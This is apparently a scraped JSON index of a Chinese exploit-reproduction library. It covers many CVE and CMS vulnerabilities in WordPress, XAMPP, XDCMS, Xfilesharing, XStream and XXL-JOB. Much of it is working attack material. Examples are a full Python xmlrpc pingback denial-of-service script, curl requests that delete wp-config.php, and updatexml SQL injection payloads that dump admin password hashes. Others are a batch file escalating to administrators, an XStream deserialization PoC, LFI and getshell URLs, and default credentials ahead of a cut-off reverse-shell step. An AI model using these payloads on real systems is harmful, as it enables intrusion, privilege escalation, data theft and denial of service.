post_id | meta_key | meta_value | +---------+---------+----------------+------------+ | 4 | 4 | _thumbnail_id | TESTC | +---------+---------+----------------+------------+ 1 row in set (0.00 sec) 2). 现在我们将_thumbnail_id修改成\"\\x00_thumbnail_id\" mysql> update wp_postmeta set meta_key = concat(0x00,'TESTC') where meta_value = '_thumbnail_id'; Query OK, 0 rows affected (0.00 sec) Rows matched: 0 Changed: 0 Warnings: 0 3). 再次执行第一步的查询 mysql> SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id'; +---------+---------+----------------+------------+ | meta_id | post_id | meta_key | meta_value | +---------+---------+----------------+------------+ | 4 | 4 | _thumbnail_id | TESTC | +---------+---------+----------------+------------+ 1 row in set (0.00 sec) 我们可以发现依然可以查询出修改后的数据。 POST META 校验绕过 我们来看下检查meta_key的代码，文件./wp-includes/meta.php： function is_protected_meta( $meta_key, $meta_type = null ) { $protected = ( '_' == $meta_key[0] ); /** * Filters whether a meta key is protected. * * [@since](/since) 3.2.0 * * [@param](/param) bool $protected Whether the key is protected. Default false. * [@param](/param) string $meta_key Meta key. * [@param](/param) string $meta_type Meta type. */ return apply_filters( 'is_protected_meta', $protected, $meta_key, $meta_type ); } isprotected_meta函数只检查了$meta_key的第一个字符是否以开头。我们有了2.1的MySQL trick，想要绕过meta_key的检查就显得容易多了。 poc 添加自定义字段，meta_key为’_thumbnail_id’的meta_value为’55 %1$%s or sleep(10)#’ 在添加自定义栏目/字段时抓包，将_thumbnail_id替换为%00_thumbnail_id 访问/wp-admin/edit.php?action=delete&_wpnonce=xxx&ids=55 %1$%s or sleep(10)#，触发SQL注入漏洞 参 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:35 "},"Web安全/Wordpress/Wordpress 系统漏洞/Wordpress = 4.9.6 任意文件删除漏洞/Wordpress = 4.9.6 任意文件删除漏洞.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/Wordpress = 4.9.6 任意文件删除漏洞/Wordpress = 4.9.6 任意文件删除漏洞.html","title":"Wordpress = 4.9.6 任意文件删除漏洞","keywords":"","body":"Wordpress \\ 一、漏洞简介 利用条件L：需要进入后台 二、漏洞影响 三、复现过程 添加新媒体 访问http://0-sec.org/wp-admin/upload.php，然后上传图片。 将$ meta [\\'thumb\\']设置为我们要删除的文件 单击我们在中上传的图像Step 2，并记住图像的ID。 访问http://0-sec.org/wp-admin/post.php?post=4&action=edit._wpnonce在页面源中查找 发送有效载荷： curl -v 'http://0-sec.org/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=editattachment&_wpnonce=***&thumb=../../../../wp-config.php' 发动攻击 在页面源码中查找 _wpnonce 发送有效载荷 curl -v 'http://9c9b.vsplate.me/wp-admin/post.php?post=4' -H 'Cookie: ***' -d 'action=delete&_wpnonce=***' 刷新页面 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:36 "},"Web安全/Wordpress/Wordpress 系统漏洞/WordPress =5.3.0 xmlrpc.php 拒绝服务漏洞/WordPress =5.3.0 xmlrpc.php 拒绝服务漏洞.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/WordPress =5.3.0 xmlrpc.php 拒绝服务漏洞/WordPress =5.3.0 xmlrpc.php 拒绝服务漏洞.html","title":"WordPress =5.3.0 xmlrpc.php 拒绝服务漏洞","keywords":"","body":"WordPress \\ 一、漏洞简介 二、漏洞影响 WordPress \\ 三、复现过程 漏洞文件 /wordpress/xmlrpc.php /wp/xmlrpc.php from urllib.parse import urlparse import sys, uuid, urllib3, requests urllib3.disable_warnings() DEBUG = True def dprint(X): if DEBUG: print(X) COUNT=0 def build_entry(pingback,target): global COUNT COUNT +=1 entry = \"methodNamepingback.ping\" entry += f\"params{pingback}/{COUNT}\" #entry += f\"params{pingback}/{uuid.uuid4()}\" entry += f\"{target}/?p=1\" #entry += f\"{target}/#e\" # taxes DB more return entry def build_request(pingback,target,entries): prefix = \"system.multicall\" suffix = \"\" request = prefix for _ in range(0,entries): request += build_entry(pingback,target) request += suffix return request def usage_die(): print(f\"[!] Usage: {sys.argv[0]} \") exit(1) def get_args(): if len(sys.argv) != 4: usage_die() action = sys.argv[1] pingback = sys.argv[2] target = sys.argv[3] if action not in (\"check\",\"attack\"): usage_die() for URL in (pingback,target): res = urlparse(URL) if not all((res.scheme,res.netloc)): usage_die() return (action,pingback,target) def main(action,pingback,target): print(\"[>] WordPress ] @roddux 2019 | Arcturus Security | labs.arcturus.net\") # he checc if action == \"check\": entries = 2 # he attacc elif action == \"attack\": entries = 2000 # but most importantly print(f\"[+] Running in {action} mode\") # he pingbacc print(f\"[+] Got pingback URL \\\"{pingback}\\\"\") print(f\"[+] Got target URL \\\"{target}\\\"\") print(f\"[+] Building {entries} pingback calls\") # entries = 1000 # TESTING xmldata = build_request(pingback,target,entries) dprint(\"[+] Request:\\n\") dprint(xmldata+\"\\n\") print(f\"[+] Request size: {len(xmldata)} bytes\") if action == \"attack\": print(\"[+] Starting attack loop, CTRL+C to stop...\") rcount = 0 try: while True: try: resp = requests.post(f\"{target}/xmlrpc.php\", xmldata, verify=False, allow_redirects=False, timeout=.2) #dprint(resp.content.decode(\"UTF-8\")[0:500]+\"\\n\") if resp.status_code != 200: print(f\"[!] Received odd status ({resp.status_code}) -- DoS successful?\") except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e: pass rcount += 1 print(f\"\\r[+] Requests sent: {rcount}\",end=\"\") except KeyboardInterrupt: print(\"\\n[>] Attack finished\",end=\"\\n\\n\") exit(0) elif action == \"check\": print(\"[+] Sending check request\") try: resp = requests.post(f\"{target}/xmlrpc.php\", xmldata, verify=False, allow_redirects=False, timeout=10) if resp.status_code != 200: print(f\"[!] Received odd status ({resp.status_code}) -- check target url\") print(\"[+] Request sent\") print(\"[+] Response headers:\\n\") print(resp.headers) print(\"[+] Response dump:\") print(resp.content.decode(\"UTF-8\")) print(\"[+] Here's the part where you figure out if it's vulnerable, because I CBA to code it\") except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e: print(\"[!] Connection error\") exit(1) print(\"[>] Check finished\") if __name__ == \"__main__\": main(*get_args() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:38 "},"Web安全/Wordpress/Wordpress 系统漏洞/Wordpress 5.2.4 cors跨域劫持漏洞/Wordpress 5.2.4 cors跨域劫持漏洞.html":{"url":"Web安全/Wordpress/Wordpress 系统漏洞/Wordpress 5.2.4 cors跨域劫持漏洞/Wordpress 5.2.4 cors跨域劫持漏洞.html","title":"Wordpress 5.2.4 cors跨域劫持漏洞","keywords":"","body":"Wordpress 5.2.4 cors跨域劫持漏洞 一、漏洞简介 CORS是一个W3C标准，全称是\"跨域资源共享\"（Cross-origin resource sharing）。通过该标准，可以允许浏览器向跨源服务器发出 XMLHttpRequest 请求，从而克服了AJAX只能同源使用的限制，进而读取跨域的资源。CORS允许Web服务器通知Web浏览器应该允许哪些其他来源从该Web服务器的回复中访问内容 漏洞产生原因：在Access-Control-Allow-Origin中反射请求的Origin值。该配置可导致任意攻击者网站可以直接跨域读取其资源内容。 二、漏洞影响 Wordpress 5.2.4 三、复现过程 1、影响版本wordpress5.2.4，首先访问首页，利用burp抓包 2、然后发送到reapeter，日常go一下，看到返回包内容，返回了/wp-json 3、我们将请求包中的url补上/wp-json，再次发包，发现出现了一堆json数据，我们将其复制到jsonbeautiful进行格式化，说明漏洞出现在：http://www.0-sec.org/wp-json， 4、我们在请求包中，加入orgin头http://192.168.1.7（实战中为你的vps），再次发送， 发现响应头内的 Access-Control-Allow-Origin:已经变成http://192.168.1.7，并且且Access-Control-Allow-Credentials:的值为true。 从而证明是存在cors漏洞的，我们可以进行cors跨域劫持 5、然后我们利用pocbox构造payload，输入漏洞链接(记住！！记住！！！加上http://)，选择http请求方法即可，选择http请求方法即可) 6、然后将生成的html内容，放到你的vps下，命名为wp-cors.html 7、然后诱骗受害者点击，就会把json数据传到你的服务器，从而获取对方敏感信息，攻击成功 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:32 "},"Web安全/XAMPP/（CVE-2020-11107）XAMPP任意命令执行漏洞/（CVE-2020-11107）XAMPP任意命令执行漏洞.html":{"url":"Web安全/XAMPP/（CVE-2020-11107）XAMPP任意命令执行漏洞/（CVE-2020-11107）XAMPP任意命令执行漏洞.html","title":"（CVE-2020-11107）XAMPP任意命令执行漏洞","keywords":"","body":"（CVE-2020-11107）XAMPP任意命令执行漏洞 一、漏洞简介 在windows下，XAMPP允许非管理员账号访问和修改其编辑器和浏览器的配置，编辑器的默认配置为notepad.exe，一旦修改配置后，则对应的每个可以访问XAMPP控制面板的用户都更改了配置。当攻击者将编辑器的值设置为恶意的.exe文件或.bat文件，与此同时如果有管理员账号通过XAMPP控制面板查看apache的日志文件，便会执行恶意的.exe文件或.bat文件，以此达到任意命令执行。 利用条件 1：windows系统、 2：装有XAMPP、 3：拥有系统普通账户、 4：管理员账户通过XAMPP面板查看logs文件。 二、漏洞影响 Apache Friends XAMPP \\ Apache Friends XAMPP 7.3.*，\\ Apache Friends XAMPP 7.4.*，\\ 三、复现过程 环境安装 第一部分：首先以管理员身份登录到windows10： 运行cmd查看当前用户，这里的Scarlett即登录的有管理员权限的账户： XAMPP任意命令执行漏洞/media/rId25.png) 安装XAMPP，注意要使用管理员权限进行安装，根据提示不要装在C盘，本次复现安装在D盘，其他按照默认安装即可，最后安装完成如下图所示： XAMPP任意命令执行漏洞/media/rId26.png) 运行cmd，输入如下命令：powershell start-process cmd -verb runas （用powershell启动管理员权限的cmd进程），在管理员权限的cmd上，输入：net user lowuser /add，创建一个普通账号lowuser，通过net user lowuser 可知为普通权限账号： XAMPP任意命令执行漏洞/media/rId27.png) 输入命令net user lowuser * 为lowuser设置密码： XAMPP任意命令执行漏洞/media/rId28.png) 关闭cmd命令窗口，注销管理员权限的Scarlett账户。 XAMPP任意命令执行漏洞/media/rId29.png) 漏洞复现 以普通账号lowuser登录到windows10： 输入上面第4步设置的密码，登录lowuser账户： XAMPP任意命令执行漏洞/media/rId31.png) 设置显示文件扩展名和隐藏项目： XAMPP任意命令执行漏洞/media/rId32.png) 创建command.bat文件，输入命令如下，其作用是将lowuser账号加入管理员权限： @echo off net localgroup administrators lowuser /add XAMPP任意命令执行漏洞/media/rId33.png) 运行xampp，并在控制面板上找到config配置。 XAMPP任意命令执行漏洞/media/rId34.png) 修改编辑器的默认配置，更改为刚才创建的command.bat文件，添加并应用，如下图所示： XAMPP任意命令执行漏洞/media/rId35.png) 查看lowuser的用户组，还是普通权限，注销lowuser账户。 XAMPP任意命令执行漏洞/media/rId36.png) 再次以管理员（Scarlett）登录到windows10： 打开XAMPP控制面板，点击查看logs文件： XAMPP任意命令执行漏洞/media/rId37.gif) 切换到lowuser账户： 运行cmd，查看lowuser用户组，发现已经提升为administators组： XAMPP任意命令执行漏洞/media/rId38.png) 参考链接 https://mp.weixin.qq.com/s?\\_\\_biz=MzU1ODg3NTMyMQ==&mid=2247490782&idx=1&sn=3c5843a34f4415e25bc0c21388c0e03a&chksm=fc1e8b08cb69021e7da183a3c9e0750cf51f9856fb647eea1f103f41bea609c64f10c9553364&mpshare=1&scene=1&srcid=&sharer\\_sharetime=1587143054964&sharer\\_shareid=346bf064ccfaeb680ec3e1af3a4fc9a8&key=64daf1adc09d7c6e5cfb777986ec80c9619f47ef9565c6f0252270416251ea412f230e87b1ec8f3435bc4fb2a9a7b5cfaef4e5e24f07f4ca67b17c37a019205e77237996ec31a74ff713a0436cb2a3a9&ascene=1&uin=MTU0OTU5NDkzMA==&devicetype=Windows+10+x64&version=6209005d&lang=zh\\_CN&exportkey=AWykz1/C4yy1gXuSSIh8VsI=&pass\\_ticket=CsmWLKOnF5M0Q2QFomZUfTPJMWXGf5jEVxKfIZtVeWb8bpfTluZvRRNsuVmT2X9Z Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:53 "},"Web安全/XDCMS/XDCMS 1.0 csrf漏洞/XDCMS 1.0 csrf漏洞.html":{"url":"Web安全/XDCMS/XDCMS 1.0 csrf漏洞/XDCMS 1.0 csrf漏洞.html","title":"XDCMS 1.0 csrf漏洞","keywords":"","body":"XDCMS 1.0 csrf漏洞 一、漏洞简介 二、漏洞影响 XDCMS 1.0 三、复现过程 CSRF漏洞常存在于涉及权限控制的地方，像管理后台、会员中心、论坛帖子、资料修改、交易管理等。 通常可检查相应代码处是否存在检测token或referer，如果没有token/referer直接请求该页面进行判断 漏洞存在于用户资料修改页面，URL：index.php?m=member&f=edit，同SQL注入2漏洞点相同 直接修改Cookie中member_userid字段，成功将其他用户信息修改 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:57 "},"Web安全/XDCMS/XDCMS 1.0 sql注入漏洞（一）/XDCMS 1.0 sql注入漏洞（一）.html":{"url":"Web安全/XDCMS/XDCMS 1.0 sql注入漏洞（一）/XDCMS 1.0 sql注入漏洞（一）.html","title":"XDCMS 1.0 sql注入漏洞（一）","keywords":"","body":"XDCMS 1.0 sql注入漏洞（一） 一、漏洞简介 二、漏洞影响 XDCMS 1.0 三、复现过程 注入存在于用户登录页面：/index.php?m=member&f=login /media/rId24.jpg) 漏洞文件:/modules/member/index.php，lines:112 /media/rId25.jpg) login_save()`在用户登录界面时调用，URL:`/index.php?m=member&f=login 参数m与f的包含方式为:/ modules/$m/$c.php index.php -> system/common.inc.php -> fun.inc.php -> global.inc.php[接受m、f参数的值] -> 包含modules/$m/$c.php $username值使用了safe_html()进行过滤，且过滤字符均可使用大小写绕过 htmlspecialchars()未设置第二个参数，导致仅对双引号\"进行转义，单引号'不会被转义掉，因而存在注入 第二个参数详解： ENT_COMPAT（默认值）：只转换双引号。 ENT_QUOTES：两种引号都转换。 ENT_NOQUOTES：两种引号都不转换。 /media/rId26.jpg) 但此处注入由于过滤了.，无法通过information_schema来获取表名，需去猜测，较为鸡肋 /media/rId27.jpg) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:57 "},"Web安全/XDCMS/XDCMS 1.0 sql注入漏洞（二）/XDCMS 1.0 sql注入漏洞（二）.html":{"url":"Web安全/XDCMS/XDCMS 1.0 sql注入漏洞（二）/XDCMS 1.0 sql注入漏洞（二）.html","title":"XDCMS 1.0 sql注入漏洞（二）","keywords":"","body":"XDCMS 1.0 sql注入漏洞（二） 一、漏洞简介 二、漏洞影响 XDCMS 1.0 三、复现过程 漏洞存在于用户资料修改页面，URL：index.php?m=member&f=edit /media/rId24.jpg) 漏洞文件位于system/modules/member/index.php，line:178 /media/rId25.jpg) $userid直接从Cookie中取出，并无任何过滤，导致注入 /media/rId26.jpg) select * from table_member where 'userid'=-4 Union seLect 1,2,username,4,5,6,7,8,9,10,11,12,password,14,15 fRom c_admin Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:10:59 "},"Web安全/XDCMS/XDCMS 1.0 xss漏洞/XDCMS 1.0 xss漏洞.html":{"url":"Web安全/XDCMS/XDCMS 1.0 xss漏洞/XDCMS 1.0 xss漏洞.html","title":"XDCMS 1.0 xss漏洞","keywords":"","body":"XDCMS 1.0 xss漏洞 一、漏洞简介 二、漏洞影响 XDCMS 1.0 三、复现过程 漏洞文件：system\\modules\\xdcms\\template.php，URL：index.php?m=xdcms&c=template&f=edit&file=footer.html 插入xss平台代码 成功接受到信息 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:00 "},"Web安全/XDCMS/XDCMS 1.0 任意文件包含漏洞/XDCMS 1.0 任意文件包含漏洞.html":{"url":"Web安全/XDCMS/XDCMS 1.0 任意文件包含漏洞/XDCMS 1.0 任意文件包含漏洞.html","title":"XDCMS 1.0 任意文件包含漏洞","keywords":"","body":"XDCMS 1.0 任意文件包含漏洞 一、漏洞简介 要求PHP版本小于5.3，否则无法使用%00截断 二、漏洞影响 XDCMS 1.0 三、复现过程 漏洞文件：api\\index.php 安全过滤函数 发生鸡肋 很明显 %00截断 http://www.0-sec.org/api/index.php?c=xxxxxx%00dama.php Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:02 "},"Web安全/XDCMS/XDCMS 1.0 后台任意文件读取/XDCMS 1.0 后台任意文件读取.html":{"url":"Web安全/XDCMS/XDCMS 1.0 后台任意文件读取/XDCMS 1.0 后台任意文件读取.html","title":"XDCMS 1.0 后台任意文件读取","keywords":"","body":"XDCMS 1.0 后台任意文件读取 一、漏洞简介 二、漏洞影响 XDCMS 1.0 三、复现过程 漏洞文件漏洞文件：system\\modules\\xdcms\\template.php，同上述xss漏洞相同 第43行未对文件进行限制，从而导致了目录遍历，造成任意文件读取 对GET数据没有过滤 http://www.0-sec.orv/xdcms/index.php?m=xdcms&c=template&f=edit&file=../../../data/config.inc.php 后台任意文件读取。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:02 "},"Web安全/XDCMS/XDCMS 1.0 后台配置文件getshell/XDCMS 1.0 后台配置文件getshell.html":{"url":"Web安全/XDCMS/XDCMS 1.0 后台配置文件getshell/XDCMS 1.0 后台配置文件getshell.html","title":"XDCMS 1.0 后台配置文件getshell","keywords":"","body":"XDCMS 1.0 后台配置文件getshell 一、漏洞简介 二、漏洞影响 XDCMS 1.0 三、复现过程 刚看到这里的时候，这里的网站地址:http://127.0.0.5我很好奇是干嘛的，因为它现在写的是127.0.0.5而网站的ip与这个无关，去翻翻源码看看这玩意是干嘛的 if($tag=='config'){ //判断url是否以/结尾 $urlnum=strlen($info['siteurl'])-1; if(substr($info['siteurl'],$urlnum,1)!=\"/\"){ showmsg(C(\"update_url_error\"),\"-1\"); }//end $cms=SYS_PATH.'xdcms.inc.php'; //生成xdcms配置文件 $cmsurl=\"\"; creat_inc($cms,$cmsurl); 点击保存后，网站获取siteurl没有经过过滤，就拼接到cmsurl字符串变量里去了，然后根据这个cmsurl生成配置文件 配置文件： 这里我们可以构造siteurl： hello');?> 点击保存后，我们去查看一下该配置文件： '; define('TP_FOLDER','dccms'); define('TP_CACHE',false); ?> 这里的配置文件内容生成外部参数可控，导致了可直接getshell 访问该配置文件页面：http://www.0-sec.org/system/xdcms.inc.php Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:04 "},"Web安全/XDCMS/XDCMS 1.0 重装系统漏洞/XDCMS 1.0 重装系统漏洞.html":{"url":"Web安全/XDCMS/XDCMS 1.0 重装系统漏洞/XDCMS 1.0 重装系统漏洞.html","title":"XDCMS 1.0 重装系统漏洞","keywords":"","body":"XDCMS 1.0 重装系统漏洞 一、漏洞简介 需要知道db密码 二、漏洞影响 XDCMS 1.0 三、复现过程 漏洞文件：install/index.php ，line：12 造成重装漏洞是由于12-14行存在变量覆盖漏洞，可以将$insLockfile变量重置为0 让step=4执行安装数据库，提供其中需要的变量。dbhost dbname dbuser dbpass dbpre dblang adminuser adminpwd 。构造 http://www.0-sec.org/install/?insLockfile=xyz0sec 不过db的用户及口令还需要借助其他方法获得。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:05 "},"Web安全/XDCMS/XDCMS 3.0 后台友情链接sql注入/XDCMS 3.0 后台友情链接sql注入.html":{"url":"Web安全/XDCMS/XDCMS 3.0 后台友情链接sql注入/XDCMS 3.0 后台友情链接sql注入.html","title":"XDCMS 3.0 后台友情链接sql注入","keywords":"","body":"XDCMS 3.0 后台友情链接sql注入 一、漏洞简介 二、漏洞影响 XDCMS 3.0 三、复现过程 友链title和url部分过滤函数成功防御了XSS，但对SQL过滤不全，关键代码如下： system/modules/link/admin.php public function addsave(){ $title=safe_html($_POST['title']); $url=safe_html($_POST['url']); if(empty($title)||empty($url)){ showmsg(C('material_not_complete'),'-1'); } $this->mysql->db_insert('link',\"`title`='\".$title.\"',`url`='\".$url.\"',`inputtime`='\".datetime().\"',`is_lock`=0\"); showmsg(C('add_success'),'index.php?m=link&c=admin'); } safe_html() function safe_html($str){ if(empty($str)){return;} $str=preg_replace('/select|insert | update | and | in | on | left | joins | delete |\\%|\\=|\\/\\*|\\*|\\.\\.\\/|\\.\\/| union | from | where | group | into |load_file |outfile/','',$str); return htmlspecialchars($str); } 经检测，后台多处存在与上面原理相同SQL注入，不再一一记录。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:06 "},"Web安全/XDCMS/XDCMS 3.0 后台登录窗sql注入漏洞/XDCMS 3.0 后台登录窗sql注入漏洞.html":{"url":"Web安全/XDCMS/XDCMS 3.0 后台登录窗sql注入漏洞/XDCMS 3.0 后台登录窗sql注入漏洞.html","title":"XDCMS 3.0 后台登录窗sql注入漏洞","keywords":"","body":"XDCMS 3.0 后台登录窗sql注入漏洞 一、漏洞简介 二、漏洞影响 XDCMS 3.0 三、复现过程 漏洞链 system/modules/xdcms/login.php public function check(){ $username = safe_html($_POST['username']); $password = safe_html($_POST['password']); $verifycode = safe_html($_POST['verifycode']); if(empty($username)||empty($password)){ showmsg(C('user_pass_empty'),'-1'); } if($verifycode!=$_SESSION['code']){ showmsg(C('verifycode_error'),'-1'); } $sql=\"select * from \".DB_PRE.\"admin where `username`='$username'\"; if($this->mysql->num_rows($sql)==0){ showmsg(C('user_not_exist'),'-1'); } $rs=$this->mysql->get_one($sql); $password=password($password,$rs['encrypt']); if($password!=$rs['password']){ showmsg(C('password_error'),'-1'); } if($rs['is_lock']==1){ showmsg(C('user_lock'),'-1'); } $logins=$rs[\"logins\"]+1; $ip=safe_replace(safe_html(getip())); $this->mysql->db_update(\"admin\",\"`last_ip`='\".$ip.\"',`last_time`=\".datetime().\",`logins`=\".$logins,\"`username`='$username'\"); $_SESSION['admin']=$rs['username']; $_SESSION['admin_id']=$rs['id']; $_SESSION['groupid']=$rs['groupid']; unset($rs); showmsg(C(\"login_success\"),\"index.php?m=xdcms&c=index\"); } safe_html() function safe_html($str){ if(empty($str)){return;} $str=preg_replace('/select|insert | update | and | in | on | left | joins | delete |\\%|\\=|\\/\\*|\\*|\\.\\.\\/|\\.\\/| union | from | where | group | into |load_file |outfile/','',$str); return htmlspecialchars($str); } safe_html()使用preg_replace()时候，pattern未添加/i修饰符，导致过滤字符可通过大小写转换或双写进行绕过； 同时，htmlspecialchars()未添加参数，默认仅对双引号进行转义 payload #爆库 username=admin%27+OR+UPDATExml(1,concat('~',(database())),0)--+&password=123&verifycode=3bdd&button= #爆表名 username=admin%27+OR+UPDATExml(1,concat('~',(SELECT+group_concat(table_name)+frOm+information_scheMA.tables+whEre+table_schema+like+'xdcms')),0)--+&password=123&verifycode=3bdd&button= //updatexml一次显示32位字符，需要偏转 username=admin%27+OR+UPDATExml(1,concat(0x7e,substr((SELECT+group_concat(table_name)+frOm+information_scheMA.tables+whEre+table_schema+like+'xdcms'),30,30)),0)--+&password=123&verifycode=3bdd&button= #爆表名 username=admin%27+OR+UPDATExml(1,concat(0x7e,substr((SELECT+group_concat(column_name)+frOm+information_scheMA.columns+whEre+table_name+like+'c_admin'),1,32)),0)--+&password=123&verifycode=3bdd&button= #爆内容 username=admin%27+OR+UPDATExml(1,concat(0x7e,(selEct+password+From+c_admin)),0)--+&password=123&verifycode=3bdd&button= 虽然获取密码hash值，但cms并未直接通过MD5获得哈希值，且无法破解该哈希值； 通过SQL注入获取到账户encrypt，再使用密码字典，依次爆破来猜测明文密码；另外可通过数据库写shell，但此时secure_file_priv被禁用 function password($password, $encrypt='') { $pwd = array(); $pwd['encrypt'] = $encrypt ? $encrypt : get_random(); $password_md5=md5(trim($password)); $nums=strlen($password_md5) - strlen($pwd['encrypt']);//encrypt:lr24vx2 $pwd['password'] = md5(substr_replace($password_md5,$pwd['encrypt'],$nums)); return $encrypt ? $pwd['password'] : $pwd; } Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:07 "},"Web安全/XDCMS/XDCMS 3.0 数据库备份任意文件夹删除/XDCMS 3.0 数据库备份任意文件夹删除.html":{"url":"Web安全/XDCMS/XDCMS 3.0 数据库备份任意文件夹删除/XDCMS 3.0 数据库备份任意文件夹删除.html","title":"XDCMS 3.0 数据库备份任意文件夹删除","keywords":"","body":"XDCMS 3.0 数据库备份任意文件夹删除 一、漏洞简介 二、漏洞影响 XDCMS 3.0 三、复现过程 漏洞点：system/modules/xdcms/data.php public function delete(){ $file=trim($_GET[\"file\"]); $dir=DATA_PATH.'backup/'.$file; if(is_dir($dir)){ //删除文件夹中的文件 if (false != ($handle = opendir ( $dir ))) { while ( false !== ($file = readdir ( $handle )) ) { if ($file != \".\" && $file != \"..\"&&strpos($file,\".\")) { @unlink($dir.\"/\".$file); } } closedir ( $handle ); } @rmdir($dir);//删除目录 } showmsg(C('success'),'-1'); } 删除数据库备份时候仅判断是否为文件夹，是则删除其中所有的文件；同时未对目录进行过滤，导致可以删除任意文件夹中的文件 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:08 "},"Web安全/Xfilesharing/（CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell/（CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell.html":{"url":"Web安全/Xfilesharing/（CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell/（CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell.html","title":"（CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell","keywords":"","body":"（CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell 一、漏洞简介 二、漏洞影响 Version: \\ 三、复现过程 任意文件上传 Shell : http://0-sec.org/cgi-bin/temp/joe/she Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:09 "},"Web安全/Xfilesharing/（CVE-2019-18952）Xfilesharing 2.5.1本地文件包含/（CVE-2019-18952）Xfilesharing 2.5.1本地文件包含.html":{"url":"Web安全/Xfilesharing/（CVE-2019-18952）Xfilesharing 2.5.1本地文件包含/（CVE-2019-18952）Xfilesharing 2.5.1本地文件包含.html","title":"（CVE-2019-18952）Xfilesharing 2.5.1本地文件包含","keywords":"","body":"（CVE-2019-18952）Xfilesharing 2.5.1本地文件包含 一、漏洞简介 二、漏洞影响 Version: \\ 三、复现过程 本地文件包含 http://0-sec.org/?op=page&tmpl=../../admin_settings 此URL将获取\" admin_settings.html\"模板，无需任何身份验证。\" .html\"扩展名在服务器上进行了硬编码，因此所包含的文件必须在服务器上的任何位置都具有html扩展名。甚至可以通过上传html文件（例如\" upload.html\"）并将\" sid\"更改为\" ../../../../../../tmp\"将LFI与任意文件上传漏洞合并，然后因此该文件将上传到服务器的tmp目录中。 http://0-sec.org/?op=page&tmpl=../../../../../../../tmp/upload Xfilesharing脚本也内置了短代码，因此您可以实现RCE通过将它 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:09 "},"Web安全/XStream/（CVE-2019-10173）Xstream 远程代码执行漏洞/（CVE-2019-10173）Xstream 远程代码执行漏洞.html":{"url":"Web安全/XStream/（CVE-2019-10173）Xstream 远程代码执行漏洞/（CVE-2019-10173）Xstream 远程代码执行漏洞.html","title":"（CVE-2019-10173）Xstream 远程代码执行漏洞","keywords":"","body":"（CVE-2019-10173）Xstream 远程代码执行漏洞 一、漏洞简介 Xstream 1.4.10版本存在反序列化漏洞CVE-2013-7285补丁绕过。 二、漏洞影响 XStream \\ XStream = 1.4.10 三、复现过程 poc package com.bigo; import com.thoughtworks.xstream.XStream; import java.beans.EventHandler; import java.io.IOException; import java.util.Set; import java.util.TreeSet; /** * Created by cfchi on 2019/7/26. */ public class Main { public static String expGen(){ XStream xstream = new XStream(); Set set = new TreeSet(); set.add(\"foo\"); set.add(EventHandler.create(Comparable.class, new ProcessBuilder(\"calc\"), \"start\")); String payload = xstream.toXML(set); System.out.println(payload); return payload; } public static void main(String[] args) throws IOException { expGen(); XStream xStream = new XStream(); String payload = \"\\n\" + \" foo\\n\" + \" \\n\" + \" java.lang.Comparable\\n\" + \" \\n\" + \" \\n\" + \" \\n\" + \" cmd.exe\\n\" + \" /c\\n\" + \" calc\\n\" + \" \\n\" + \" \\n\" + \" start\"+ \" \\n\" + \" \\n\" + \"\\n\"; xStream.fromXML(payload); } } 1.4.7版本白名单 Xstream远程代码执行漏洞/media/rId26.png) 1.4.10版本，黑名单未开启 Xstream远程代码执行漏洞/media/rId28.png) 1.4.11版本，黑名单开启 黑名单 private class InternalBlackList implements Converter { private InternalBlackList() { } public boolean canConvert(Class type) { return type == Void.TYPE || type == Void.class || !XStream.this.securityInitialized && type != null && (type.getName().equals(\"java.beans.EventHandler\") || type.getName().endsWith(\"$LazyIterator\") || type.getName().startsWith(\"javax.crypto.\")); } public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) { throw new ConversionException(\"Security alert. Marshalling rejected.\"); } public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) { throw new ConversionException(\"Security alert. Unmarshalling rejected.\"); } } Xstream远程代码执行漏洞/media/rId31.png) 参考链接 http://www.polaris-lab.com/index.php/archives/658/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:11 "},"Web安全/XXL-JOB/XXL-JOB 任务调度中心 反弹shell/XXL-JOB 任务调度中心 反弹shell.html":{"url":"Web安全/XXL-JOB/XXL-JOB 任务调度中心 反弹shell/XXL-JOB 任务调度中心 反弹shell.html","title":"XXL-JOB 任务调度中心 反弹shell","keywords":"","body":"XXL-JOB 任务调度中心 后台反弹shell 一、漏洞简介 二、漏洞影响 三、复现过程 弱口令登录 账号：admin 密码：123456（XXL-JOB的默认账号、密码） 点击任务管理、新增一个执行任务，配置如下（运行模式选择shell，cron是linux定时任务，如下0时0分0秒执行一次）： 进入GLUE面板，写入执行的脚本命令。随意命名备注名称，保存并关闭 